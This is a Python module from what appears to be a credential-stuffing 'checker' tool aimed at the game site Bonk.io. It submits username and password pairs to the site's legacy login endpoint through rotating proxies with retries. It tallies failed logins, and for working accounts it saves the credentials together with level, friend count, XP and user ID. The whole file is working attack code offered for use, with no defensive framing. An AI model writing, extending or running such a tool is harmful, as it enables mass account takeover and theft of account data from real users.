from pyautogui import sleep
from modules.variables import Checker
from modules.functions import set_proxy,log,save,bad_proxy, return_proxy
from requests import Session
from math import sqrt
from requests.adapters import HTTPAdapter, Retry
import functools

def check(email:str,password:str):
    username = email.split("@")[0] if "@" in email else email
    
    while not Checker.stopping:
        try:
            proxy = set_proxy()
            proxy_set = set_proxy(proxy)

            with Session() as s:
                s.request = functools.partial(s.request, timeout=Checker.timeout)
                s.proxies.update(proxy_set)
                retries = Retry(total=Checker.retries, backoff_factor=0.1)
                s.mount('http://', HTTPAdapter(max_retries=retries))
                s.mount('https://', HTTPAdapter(max_retries=retries))

                payload = {'username':username,'password':password}
                response = s.post("https://bonk2.io/scripts/login_legacy.php",data=payload).json()
            
            if response["r"] == "fail":
                if response.get("e") == "password" or response.get("e") == "username_fail":
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
    
                raise
            elif "xp" in response:
                xp = response["xp"]
                friends = len(response["friends"])
                legacy_friends = response.get("legacyFriends")
                if legacy_friends:
                    friends += legacy_friends.count("#")
                user_id = response["id"]
                
                if int(xp): level = int(sqrt(int(xp)/100))
                else: level = 0

                if not Checker.cui: log("good",':'.join([username,password]),"Bonk.io")
                save("BonkIO","good",Checker.time,':'.join([username,password])+f" | Level: {level} | Friends: {friends} | Xp: {xp} | UserID: {user_id}")
                Checker.good += 1
                return_proxy(proxy)
                return
        except:
            bad_proxy(proxy)
            return_proxy(proxy)
            Checker.errors += 1
            continue
    
        